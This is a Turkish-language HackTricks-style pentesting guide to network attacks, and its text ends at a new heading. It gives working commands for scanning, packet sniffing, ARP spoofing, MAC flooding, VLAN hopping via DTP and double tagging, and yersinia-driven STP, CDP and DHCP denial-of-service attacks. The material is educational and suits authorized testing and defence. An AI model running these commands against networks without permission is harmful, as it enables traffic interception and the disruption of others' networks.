# Pentesting Ağ

{{#include ../../banners/hacktricks-training.md}}



## Dışarıdan hosts keşfi

Bu, **kısa bir bölüm** olacak; **Internet**'ten **IPs**'in yanıt verip vermediğini nasıl bulacağınızı anlatır.\
Bu durumda bazı **scope of IPs** (belki birkaç **ranges**) bulunur ve hangi **IPs**'lerin yanıt verdiğini bulmanız gerekir.

### ICMP

Bu, bir host'un çalışıp çalışmadığını tespit etmenin **en kolay** ve **en hızlı** yoludur.\
Bazı **ICMP** paketleri gönderip **cevap bekleyebilirsiniz**. En kolay yol sadece bir **echo request** göndermek ve yanıt beklemektir. Bunu basit bir `ping` veya `fping` ile **ranges** için yapabilirsiniz.\
Ayrıca farklı türde ICMP paketleri göndermek için **nmap** kullanabilirsiniz (bu, yaygın ICMP echo request-response filtrelerini atlatacaktır).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Her türlü ICMP paketinin filtrelendiğini görmek çok yaygındır. Bu durumda bir host'un up olup olmadığını kontrol etmek için yapabileceğiniz tek şey **açık portları bulmaya çalışmaktır**. Her host'un **65535 portu** vardır, bu nedenle kapsamınız "büyük" ise her bir hostun **her portunu** tek tek test edemezsiniz — bu çok zaman alır.\
Bu durumda ihtiyacınız olan bir **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) ve en çok kullanılan **portların** bir listesi:
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Bu adımı `nmap` ile de gerçekleştirebilirsiniz, ancak daha yavaştır ve `nmap`'in hosts up olarak tanımlamada sorunları vardır.

### HTTP Port Keşfi

Bu sadece bir TCP port keşfidir ve **HTTP'yi keşfetmeye odaklanmak** **hizmetleri** istediğinizde yararlıdır:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Ayrıca bazı **UDP port open** olup olmadığını kontrol etmeyi deneyebilirsiniz; bu, bir **host.** için **pay more attention** edip etmemeniz gerektiğine karar vermenize yardımcı olur. Çünkü UDP services genellikle regular empty UDP probe packet'ine **don't respond** ve **any data** ile yanıt vermediğinden, bir portun filtrelenip filtrelenmediğini ya da açık olup olmadığını söylemek zordur. Bunu belirlemenin en kolay yolu, çalışan service ile ilişkili bir packet göndermektir; hangi service'in çalıştığını bilmediğiniz için port number'a göre en olası olanları denemelisiniz:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Önceden önerilen nmap satırı **top 1000 UDP ports**'u **/24** aralığındaki her hostta test edecek, ancak bunun bile **>20min** sürecektir. Eğer **en hızlı sonuçlara** ihtiyacınız varsa [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) kullanabilirsiniz: `./udp-proto-scanner.pl 199.66.11.53/24` Bu, bu **UDP probes**'ları **expected port**'larına gönderecek (bir /24 aralığı için bu sadece 1 min sürecek): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Keşfi
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Burada yazım zamanı itibarıyla bilinen tüm Wifi saldırılarına dair güzel bir rehber bulabilirsiniz:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## İçeriden hosts keşfetme

Eğer ağın içindeyseniz, yapmak isteyeceğiniz ilk şeylerden biri **diğer hosts**'u **keşfetmek** olacaktır. Ne kadar **gürültü** yapabileceğinize/istemediğinize bağlı olarak farklı işlemler yapılabilir:

### Pasif

Bağlı bir ağ içinde hosts'ları pasif olarak keşfetmek için bu araçları kullanabilirsiniz:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktif

[_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) bölümünde bahsedilen teknikler burada da **uygulanabilir**.\
Ancak, diğer hosts ile **aynı ağ** içinde olduğunuz için, **daha fazla şey** yapabilirsiniz:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktif ICMP

Dışarıdan host keşfi sırasında bahsedilen tekniklerin (_Discovering hosts from the outside_ ([_**ICMP**_](#icmp))) buraya da **uygulanabileceğini** unutmayın.\
Ancak, diğer hostlarla **aynı ağ** içindeyken, **daha fazla şey** yapabilirsiniz:

- Eğer bir **subnet broadcast address**'e **ping** atarsanız, ping **her hosta** ulaşmalı ve onlar size **yanıt verebilir**: `ping -b 10.10.5.255`
- **network broadcast address**'i **ping**'leyerek, hatta **diğer alt ağlardaki** hostları bulabilirsiniz: `ping -b 255.255.255.255`
- `nmap`'in `-PE`, `-PP`, `-PM` bayraklarını kullanarak sırasıyla **ICMPv4 echo**, **timestamp** ve **subnet mask requests** gönderip host keşfi yapın: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan, bilgisayarları bir **ağ mesajı** yoluyla **açmak** için kullanılır.\
Bilgisayarı açmak için kullanılan magic packet, içinde bir **MAC Dst** bulunan ve aynı paket içinde **16 kez tekrarlanan** bir pakettir.\
Bu tür paketler genellikle bir **ethernet 0x0842** içinde veya bir **UDP packet to port 9** içinde gönderilir.\
Eğer **no \[MAC]** sağlanmazsa, paket **broadcast ethernet** adresine gönderilir (ve tekrar edilen MAC, broadcast MAC olacaktır).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Host'ları Tarama

Derinlemesine taramak istediğiniz tüm IP'leri (external veya internal) keşfettikten sonra farklı işlemler gerçekleştirilebilir.

### TCP

- **Açık** port: _SYN --> SYN/ACK --> RST_
- **Kapalı** port: _SYN --> RST/ACK_
- **Filtrelenmiş** port: _SYN --> \[NO RESPONSE]_
- **Filtrelenmiş** port: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Bir UDP portunu taramak için 2 seçenek vardır:

- Bir **UDP packet** gönderin ve port **closed** ise dönen cevabı _**ICMP unreachable**_ kontrol edin (birçok durumda ICMP **filtered** olur; bu yüzden portun kapalı mı yoksa açık mı olduğuna dair bilgi alamayabilirsiniz).
- Bir **formatted datagrams** göndererek bir **service**'den yanıt almaya çalışın (ör. DNS, DHCP, TFTP ve diğerleri; _nmap-payloads_'ta listelendiği gibi). Eğer bir **response** alırsanız, port **open**'dır.

**Nmap**, "-sV" kullanarak her iki seçeneği de birleştirir (UDP taramaları çok yavaştır), ancak UDP taramalarının TCP taramalarından daha yavaş olduğunu unutmayın:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)**, **TCP (Transmission Control Protocol)** ve **UDP (User Datagram Protocol)** ile birlikte kullanılacak şekilde tasarlanmıştır. Temel amacı, IP ağları üzerinden telefon verilerinin iletimini kolaylaştırmak olup, **Signaling System 7 (SS7)**'de bulunan birçok güvenilirlik özelliğini yansıtır. **SCTP**, SS7 sinyallerini IP ağları üzerinden taşımayı amaçlayan **SIGTRAN** protokol ailesinin temel bir bileşenidir.

**SCTP** desteği **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** ve **VxWorks** gibi çeşitli işletim sistemleri tarafından sağlanır; bu da telekomünikasyon ve ağ alanında geniş kabul ve kullanımını gösterir.

nmap, SCTP için iki farklı tarama sunar: _-sY_ ve _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **Daha fazla nmap seçeneği**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### İç IP Adreslerini Ortaya Çıkarma

**yanlış yapılandırılmış routers, firewalls ve ağ cihazları** bazen ağ taramalarına **kamuya açık olmayan kaynak adresleri** kullanarak yanıt verir. **tcpdump** test sırasında özel adreslerden alınan paketleri belirlemek için kullanılabilir. Özellikle, Kali Linux'ta, genel Internet'ten erişilebilir olan **eth2 interface** üzerinde paketler yakalanabilir. Kurulumunuz bir NAT veya Firewall arkasındaysa, bu tür paketlerin filtrelenmesi muhtemeldir.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing ile yakalanan frames ve packets'leri inceleyerek IP ranges, subnet sizes, MAC addresses ve hostnames hakkında detayları öğrenebilirsiniz. Eğer network yanlış yapılandırılmışsa veya switching fabric stress altındaysa, saldırganlar passive network sniffing ile hassas verileri yakalayabilir.

Eğer switched Ethernet network düzgün yapılandırıldıysa, yalnızca broadcast frames ve MAC address'inize yönelik materyali görürsünüz.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Ayrıca, Wireshark'ı GUI olarak kullanarak SSH oturumu üzerinden uzak bir makineden paketler gerçek zamanlı olarak yakalanabilir.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Açıkçası.

### Yakalama credentials

Bir pcap'ten veya canlı bir arayüzden credentials çıkarmak için [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) gibi araçlar kullanabilirsiniz.

## LAN saldırıları

### ARP spoofing

ARP Spoofing, bir makinenin IP'sinin cihazımızın MAC adresine ait olduğunu belirtmek için gratuitous ARPResponses göndermeyi içerir. Ardından, kurban ARP tablosunu değiştirecek ve spoofed IP ile iletişime geçmek istediğinde her seferinde makinemizle iletişim kuracaktır.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Switch'in CAM table'ını farklı source MAC adreslerine sahip çok sayıda paket göndererek doldurun. CAM table dolduğunda switch hub gibi davranmaya başlar (tüm trafiği broadcast eder).
```bash
macof -i <interface>
```
In modern switches this vulnerability has been fixed.

### 802.1Q VLAN / DTP Saldırıları

#### Dynamic Trunking

The **Dynamic Trunking Protocol (DTP)**, trunking için otomatik bir sistem sağlamak amacıyla tasarlanmış bir link katmanı protokolüdür; bu sayede switch'ler portları otomatik olarak trunk mode (Trunk) veya non-trunk mode olarak seçebilir. DTP'nin kullanımı genellikle yetersiz ağ tasarımını işaret eder; bu da trunks'ın sadece gerekli yerlerde manuel olarak yapılandırılmasının ve uygun şekilde dökümante edilmesinin önemini vurgular.

Varsayılan olarak switch portları Dynamic Auto modunda çalışacak şekilde ayarlanmıştır; bu, komşu bir switch tarafından tetiklenirse trunking'i başlatmaya hazır oldukları anlamına gelir. Bir pentester veya saldırgan switch'e bağlanıp bir DTP Desirable frame gönderdiğinde güvenlik riski ortaya çıkar; bu, portu trunk mode'a girmeye zorlar. Bu eylem, saldırganın STP frame analizleriyle VLAN'ları keşfetmesine ve sanal arayüzler oluşturarak VLAN segmentasyonunu atlatmasına olanak tanır.

Birçok switch'te DTP'nin varsayılan olarak bulunması, saldırganların bir switch'in davranışını taklit etmek için bunu istismar etmesine ve böylece tüm VLAN'lar üzerindeki trafiğe erişim kazanmasına olanak tanır. The script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) bir arayüzü izlemek için kullanılır; switch'in Default, Trunk, Dynamic, Auto veya Access modunda olup olmadığını ortaya çıkarır — sonuncusu VLAN hopping attacks'a karşı tek etkilenmez yapılandırmadır. Bu araç switch'in zafiyet durumunu değerlendirir.

Ağda zafiyet tespit edilirse, _**Yersinia**_ aracı DTP protokolü üzerinden "enable trunking" yapmak için kullanılabilir; bu da tüm VLAN'lardaki paketlerin gözlemlenmesine imkan tanır.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

VLAN'ları enumerate etmek için DTP Desirable frame'i [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)** scripti ile oluşturmak da mümkündür. D**Scripti hiçbir koşulda durdurmayın. Her üç saniyede bir DTP Desirable enjekte eder. **Anahtar üzerinde dinamik olarak oluşturulan trunk kanalları sadece beş dakika boyunca aktif kalır. Beş dakikadan sonra trunk düşer.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Belirtmek isterim ki **Access/Desirable (0x03)** DTP çerçevesinin Desirable tipinde olduğunu gösterir; bu, portun Trunk moda geçmesini söyler. Ve **802.1Q/802.1Q (0xa5** **802.1Q** kapsülleme türünü gösterir.

STP çerçevelerini analiz ederek, **VLAN 30 ve VLAN 60'ın varlığını öğreniriz.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Belirli VLAN'lara saldırma

VLAN ID'lerini ve IP değerlerini öğrendikten sonra, belirli bir VLAN'a saldırmak için **sanal bir arayüz yapılandırabilirsiniz**.\
Eğer DHCP yoksa, statik bir IP adresi ayarlamak için _ifconfig_ kullanın.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Otomatik VLAN Hopper

Tartışılan saldırı olan **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** diğer VLAN'larda araç tarafından **otomatik olarak** gerçekleştirilir: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Eğer bir saldırgan **MAC, IP and VLAN ID of the victim host** değerini biliyorsa, çerçeveyi kendi atanmış VLAN'ıyla hedefin VLAN'ı olacak şekilde **double tag a frame** yapıp paket göndermeyi deneyebilir. Hedefin **victim won't be able to connect back** olacağı için, saldırgan için en iyi seçenek, SNMP gibi bazı ilginç işlemleri yapabilecek protokollerle **UDP** üzerinden iletişim kurmaktır.

Saldırganın bir diğer seçeneği, hedef tarafından erişilebilen ve saldırgan tarafından kontrol edilen bir IP'yi taklit ederek **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** başlatmaktır (muhtemelen internet üzerinden). Daha sonra, eğer hedeften bazı paketler alırsa, saldırgan bunları kendi sahip olduğu ikinci host üzerinde sniff edebilir.

![](<../../images/image (190).png>)

Bu saldırıyı gerçekleştirmek için scapy kullanabilirsiniz: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Yanal VLAN Segmentasyonunu Atlatma <a href="#d679" id="d679"></a>

Eğer **doğrudan bağlı olduğunuz bir switch'e erişiminiz** varsa, ağ içindeki **VLAN segmentasyonunu atlatma** yeteneğine sahipsiniz. Tek yapmanız gereken **portu trunk moduna** almak (diğer adıyla trunk), hedef VLAN'ların ID'leriyle sanal arayüzler oluşturmak ve bir IP adresi yapılandırmaktır. Adresi dinamik olarak talep etmeyi (DHCP) ya da statik olarak yapılandırmayı deneyebilirsiniz. Duruma bağlıdır.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Atlatma

Bazı ortamlarda, örneğin guest wireless ağlarında, **port isolation (also known as private VLAN)** ayarları, bir access point'e bağlı istemcilerin birbirleriyle doğrudan iletişim kurmasını engellemek için uygulanır. Ancak bu izolasyon önlemlerini aşabilen bir teknik tanımlanmıştır. Bu teknik, ya ağ ACL'lerinin eksikliğinden ya da yanlış yapılandırılmasından faydalanarak IP paketlerinin bir router üzerinden yönlendirilip aynı ağdaki başka bir istemciye ulaşmasını mümkün kılar.

Saldırı, **hedef istemcinin IP adresini taşıyan fakat router'ın MAC adresini kullanan bir paket** oluşturularak gerçekleştirilir. Bu durum router'ın paketi yanlışlıkla hedef istemciye iletmesine neden olur. Bu yaklaşım, Double Tagging Attacks'ta kullanılan yönteme benzer; burada mağdurun erişebildiği bir hostun kontrolü, güvenlik açığından faydalanmak için kullanılır.

**Saldırının Ana Adımları:**

1. **Paket Hazırlama:** Hedef istemcinin IP adresini içeren ancak router'ın MAC adresini kullanan özel bir paket hazırlanır.
2. **Router Davranışından Yararlanma:** Hazırlanan paket router'a iletilir; yapılandırma nedeniyle router paketi hedef istemciye yönlendirir ve private VLAN tarafından sağlanan izolasyon atlanır.

### VTP Saldırıları

VTP (VLAN Trunking Protocol) VLAN yönetimini merkezi hale getirir. VLAN veritabanı bütünlüğünü korumak için revision number'ları kullanır; herhangi bir değişiklik bu sayıyı artırır. Switch'ler daha yüksek revision number'a sahip konfigürasyonları benimser ve kendi VLAN veritabanlarını günceller.

#### VTP Domain Rolleri

- **VTP Server:** VLAN'ları yönetir—oluşturur, siler, değiştirir. Domain üyesi cihazlara VTP announcements yayınlar.
- **VTP Client:** VTP announcements alarak VLAN veritabanını senkronize eder. Bu rol yerel VLAN konfigürasyon değişikliklerine izin vermez.
- **VTP Transparent:** VTP güncellemelerine katılmaz ancak VTP announcements'ı iletir. VTP saldırılarından etkilenmez; revision number'ı sıfır olarak sabittir.

#### VTP Advertisement Türleri

- **Summary Advertisement:** VTP server tarafından her 300 saniyede yayınlanan, temel domain bilgisini taşıyan duyurudur.
- **Subset Advertisement:** VLAN konfigürasyonu değiştikten sonra gönderilen duyurudur.
- **Advertisement Request:** VTP client tarafından Summary Advertisement talep etmek için gönderilir; genellikle daha yüksek bir configuration revision number tespit edildiğinde tetiklenir.

VTP zafiyetleri yalnızca trunk portlar üzerinden sömürülebilir çünkü VTP announcements sadece bu portlar üzerinden dolaşır. Bir DTP saldırısının ardından senaryolar VTP'ye kayabilir. Yersinia gibi araçlar VTP saldırılarını kolaylaştırabilir; amaç VLAN veritabanını silmek ve böylece ağı etkin şekilde bozmak olabilir.

Note: Bu tartışma VTP version 1 (VTPv1) ile ilgilidir.
```bash
yersinia -G # Launch Yersinia in graphical mode
```
Yersinia'nın grafik modunda, VLAN veritabanını temizlemek için deleting all VTP vlans seçeneğini seçin.

### STP Saldırıları

**Arayüzlerinizde BPDU çerçevelerini yakalayamıyorsanız, bir STP saldırısında başarılı olma ihtimaliniz düşüktür.**

#### **STP BPDU DoS**

Çok sayıda BPDUs TCP (Topology Change Notification) veya Conf (the BPDUs that are sent when the topology is created) gönderilmesi durumunda switch'ler aşırı yüklenir ve düzgün çalışmayı durdurur.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Bir TCP gönderildiğinde, switch'lerin CAM table'ı 15s içinde silinir. Sürekli olarak bu tür packets gönderirseniz, CAM table sürekli (veya her 15segs'te) yeniden başlatılır ve yeniden başlatıldığında switch hub gibi davranır.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Saldırgan bir switch'in davranışını taklit ederek ağın STP root'u olur. Böylece daha fazla veri onun üzerinden geçer. Bu, iki farklı switch'e bağlı olduğunuzda ilgi çekicidir.\
Bu, BPDUs CONF packets gönderilerek **priority** değerinin gerçek root switch'in mevcut priority değerinden daha düşük olduğunu söylemesi sağlanarak yapılır.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Eğer attacker 2 switches'e bağlıysa, yeni ağacın root'u olabilir ve bu switches arasındaki tüm trafik onun üzerinden geçer** (bir MITM attack gerçekleştirilecek).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Saldırıları

CISCO Discovery Protocol (CDP), CISCO cihazları arasında iletişim için esastır; cihazların birbirlerini **tanımlamalarına ve yapılandırma bilgilerini paylaşmalarına** olanak tanır.

#### Pasif Veri Toplama <a href="#id-0e0f" id="id-0e0f"></a>

CDP, tüm portlar üzerinden bilgi yayınlayacak şekilde yapılandırılmıştır; bu durum bir güvenlik riski oluşturabilir. Bir saldırgan switch portuna bağlandığında **Wireshark**, **tcpdump** veya **Yersinia** gibi network sniffers kurabilir. Bu işlem, cihazın modeli ve çalıştırdığı Cisco IOS sürümü dahil olmak üzere ağ cihazı hakkında hassas verileri ortaya çıkarabilir. Saldırgan daha sonra tespit edilen Cisco IOS sürümündeki belirli zafiyetleri hedefleyebilir.

#### CDP Table Flooding'ı Tetikleme <a href="#id-0d6a" id="id-0d6a"></a>

Daha agresif bir yaklaşım, meşru CISCO cihazıymış gibi davranıp switch'in belleğini doldurarak bir Denial of Service (DoS) saldırısı başlatmayı içerir. Aşağıda, test amaçlı bir network tool olan Yersinia kullanılarak böyle bir saldırıyı başlatmak için komut dizisi yer almaktadır:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Bu saldırı sırasında, switch'in CPU'su ve CDP komşu tablosu ağır şekilde yüklenir, aşırı kaynak tüketimi nedeniyle sıklıkla **“ağ felci”** olarak adlandırılan duruma yol açar.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### VoIP Saldırıları ve VoIP Hopper Aracı

VoIP telefonları, IoT cihazlarıyla giderek daha fazla entegre edilerek özel telefon numaraları aracılığıyla kapı açma veya termostat kontrolü gibi işlevler sunar. Ancak bu entegrasyon güvenlik riskleri oluşturabilir.

Araç [**voiphopper**](http://voiphopper.sourceforge.net), çeşitli ortamlarda (Cisco, Avaya, Nortel, Alcatel-Lucent) bir VoIP telefonu taklit edecek şekilde tasarlanmıştır. Ses ağının VLAN ID'sini CDP, DHCP, LLDP-MED ve 802.1Q ARP gibi protokolleri kullanarak keşfeder.

**VoIP Hopper** , Cisco Discovery Protocol (CDP) için üç mod sunar:

1. **Sniff Mode** (`-c 0`): Ağ paketlerini analiz ederek VLAN ID'sini tespit eder.
2. **Spoof Mode** (`-c 1`): Gerçek bir VoIP cihazının paketlerini taklit eden özel paketler üretir.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Belirli bir Cisco IP telefon modeliyle aynı olan paketleri gönderir.

Hız için tercih edilen mod üçüncüsüdür. Aşağıların belirtilmesini gerektirir:

- Saldırganın ağ arayüzü (`-i` parameter).
- Emüle edilecek VoIP cihazının adı (`-E` parameter), Cisco adlandırma formatına uygun olmalıdır (ör. SEP followed by a MAC address).

Kurumsal ortamlarda, mevcut bir VoIP cihazını taklit etmek için şunlar yapılabilir:

- Telefon üzerindeki MAC etiketini incelemek.
- Model bilgisini görmek için telefonun ekran ayarlarında gezinmek.
- VoIP cihazını bir dizüstüne bağlayıp Wireshark kullanarak CDP isteklerini gözlemlemek.

Aracı üçüncü modda çalıştırmak için örnek bir komut şu şekilde olabilir:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Saldırıları

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Two types of DoS** DHCP sunucularına karşı gerçekleştirilebilir. İlki, **simulate enough fake hosts to use all the possible IP addresses** şeklindedir.\
Bu saldırı yalnızca DHCP sunucusunun yanıtlarını görebiliyorsanız ve protokolü tamamlayabiliyorsanız işe yarar (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Örneğin, bu **WiFi ağlarında mümkün değildir**.

DHCP DoS gerçekleştirmek için bir diğer yol, kaynak olarak her olası IP'yi kullanarak bir **DHCP-RELEASE packet using as source code every possible IP** göndermektir. Böylece sunucu, herkesin IP'yi kullanmayı bitirdiğini düşünecektir.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Bunu daha otomatik yapmak için [DHCPing](https://github.com/kamorin/DHCPig) aracını kullanabilirsiniz.

Bahsedilen DoS saldırılarını, ortam içindeki istemcileri yeni lease'ler almaya zorlamak ve meşru sunucuları tüketip yanıt vermez hale getirmek için kullanabilirsiniz. Böylece meşru sunucular yeniden bağlanmaya çalıştıklarında, **bir sonraki saldırıda bahsedilen kötü amaçlı değerleri sunabilirsiniz**.

#### Kötü amaçlı değerleri ayarlama

